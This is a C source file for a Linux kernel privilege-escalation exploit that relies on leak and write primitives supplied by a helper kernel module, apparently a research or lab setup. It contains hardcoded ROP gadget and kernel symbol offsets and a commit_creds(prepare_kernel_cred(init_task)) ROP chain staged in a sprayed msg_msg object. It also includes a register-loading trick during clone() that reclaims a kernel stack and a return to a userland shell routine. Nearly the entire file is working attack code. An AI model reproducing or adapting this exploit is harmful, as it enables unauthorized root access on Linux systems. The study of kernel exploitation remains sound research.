#include "utils.h"
#include "ulkm.h"
#include "msg_msg.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <pthread.h>

#define MSG_TYPE 0x41
#define MSG_HEADER 48
#define MSG_SIZE (4096 - MSG_HEADER)
#define MSG_TEXT_OFFSET 2048

#define SPRAY_THREADS 128
#define RECLAIM_STACK_THREADS 256

#define STACK_SZ (4<<12)
#define NEXT_STACK 16*STACK_SZ

// 0xffffffff818326ea: add rsp, 0x30; pop rbp; ret; 
#define ADD_RSP_0X38_RET_OFFSET 0x8326ea
// 0xffffffff8184c11f: push rax; pop rbp; ret; 
#define PUSH_RAX_POP_RBP_RET_OFFSET 0x84c11f
// 0xffffffff810e324c: mov rsp, rbp; pop rbp; ret; 
#define MOV_RSP_RBP_POP_RET_OFFSET 0xe324c
// 0xffffffff810e32f0: pop rdi; ret; 
#define POP_RDI_RET_OFFSET 0xe32f0
// 0xffffffff81608764: xchg rdi, rax; ret; 
#define XCHG_RDI_RAX_RET_OFFSET 0x608764

#define SWAPGS_POP_RET_OFFSET 0x140136c
#define IRET_OFFSET 0x140183d
#define FIND_TASK_BY_VPID_OFFSET 0x133020
#define PREPARE_KERNEL_CRED_OFFSET 0x140d00
#define COMMIT_CREDS_OFFSET 0x140780
#define INIT_TASK_OFFSET 0x240fcc0
#define INIT_CRED_OFFSET 0x2490220

size_t _text;
size_t stack;
size_t msg_msg;
enum state
{
    DO_LEAK,
    STACK_LEAKED,
} state;

size_t user_cs;
size_t user_ss;
size_t user_sp;
size_t user_rflags;
void save_state(void)
{
    __asm__ (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void *leak_task(__attribute__((unused))void *arg)
{
    pin_to_core(1);
    lkm_stack_leak((size_t)&stack);
    stack += NEXT_STACK;
    printf("[+] leaked stack %016zx\n", stack);
    return 0;
}

void *spray_task(__attribute__((unused))void *arg)
{
    pin_to_core(2);
    sleep(-1);
    return 0;
}

int empty_function(__attribute__((unused))void *arg)
{
    // pin_to_core(3);
    // sleep(-1);
    return 0;
}

void shell(void)
{
    // register size_t rax asm("rax");
    // printf("[*] rax %016zx\n", rax);
    printf("[+] uid %d gid %d\n", getuid(), getgid());
    // sleep(-1);
    printf("[+] success\n");
    exit(0);
    int ret = system("/bin/sh");
    if (ret < 0) {
        perror("system");
        exit(-1);
    }
}

void build_rop_chain(size_t *rop)
{
    *rop++ = 0; // rbp
    *rop++ = POP_RDI_RET_OFFSET+_text;
    *rop++ = INIT_TASK_OFFSET+_text;
    *rop++ = PREPARE_KERNEL_CRED_OFFSET+_text;
    *rop++ = XCHG_RDI_RAX_RET_OFFSET+_text;
    *rop++ = COMMIT_CREDS_OFFSET+_text;
    *rop++ = SWAPGS_POP_RET_OFFSET+_text;
    *rop++ = 0; // rbp
    *rop++ = IRET_OFFSET+_text;
    *rop++ = (size_t)&shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;
}

char thread_stack[1<<15];

int main(void)
{
    save_state();
    pin_to_core(0);
    printf("[*] start\n");
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    lkm_init();
    lkm_code_leak((size_t)&_text);
    printf("[+] _text %016zx\n", _text);

    static char buffer[0x1000] = {0};
    msg *message = (msg *)buffer;
    message->mtype = MSG_TYPE;

    build_rop_chain((size_t *)(message->mtext+MSG_TEXT_OFFSET));

    int qid = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    send_msg(qid, message, MSG_SIZE, 0);

    lkm_msg_msg_leak((size_t)&msg_msg, qid, MSG_TYPE);
    printf("[+] msg_msg %016zx\n", msg_msg);

    int ret;
    pthread_t tid;
    for (size_t i = 0; i < SPRAY_THREADS; ++i) {
        ret = pthread_create(&tid, 0, spray_task, 0);
        if (ret < 0) {
            perror("pthread_create(spray_task)");
            exit(-1);
        }
    }

    printf("[*] create leak task\n");
    ret = pthread_create(&tid, 0, leak_task, 0);
    if (ret < 0) {
        perror("pthread_create(leak_task)");
        exit(-1);
    }

    printf("[*] join leak task\n");
    pthread_join(tid, 0);
    for (size_t i = 0; i < RECLAIM_STACK_THREADS; ++i) {
        /* load small first payload on the stack via user registers */
        register size_t r12 asm("r12");
        size_t old_r12 = r12;
        register size_t r13 asm("r13");
        size_t old_r13 = r13;
        register size_t r14 asm("r14");
        size_t old_r14 = r14;
        asm volatile(
            "mov %[st90], %%r12;"
            "mov %[st98], %%r13;"
            "mov %[sta0], %%r14;"
            ::
                [st90]"r"(_text+MOV_RSP_RBP_POP_RET_OFFSET),
                [st98]"r"(_text+PUSH_RAX_POP_RBP_RET_OFFSET),
                [sta0]"r"(_text+XCHG_RDI_RAX_RET_OFFSET)
        );
        clone(empty_function, thread_stack+sizeof(thread_stack), CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID, 0);
        asm volatile(
            "mov %%r12, %[old_r12];"
            "mov %%r13, %[old_r13];"
            "mov %%r14, %[old_r14];"
            :: 
                [old_r12]"m"(old_r12),
                [old_r13]"m"(old_r13),
                [old_r14]"m"(old_r14)
        );
    }
    /* overwrite function pointer with rdi register */
    lkm_write(stack+STACK_SZ-0xc0, _text+ADD_RSP_0X38_RET_OFFSET); // <- R12, RIP
    lkm_write(stack+STACK_SZ-0xc8, msg_msg+MSG_HEADER+MSG_TEXT_OFFSET); // <- R13, RDI

    /* for testing */
    // lkm_write(stack+STACK_SZ-0xb8, 0x4141414141414141);
    // lkm_write(stack+STACK_SZ-0xc0, 0x4242424242424242); // <- R12, RIP
    // lkm_write(stack+STACK_SZ-0xc8, 0x4343434343434343); // <- R13, RDI
    // lkm_write(stack+STACK_SZ-0xd0, 0x4444444444444444);
    // lkm_write(stack+STACK_SZ-0xd8, 0x4545454545454545); // <- R14
    // lkm_write(stack+STACK_SZ-0xe0, 0x4646464646464646); // <- R15

    printf("[*] main thread sleep\n");
    sleep(1);
    cleanup_queue(qid);
    printf("[*] did not reclaim stack -> repeat!\n");
    printf("[*] done\n");
}
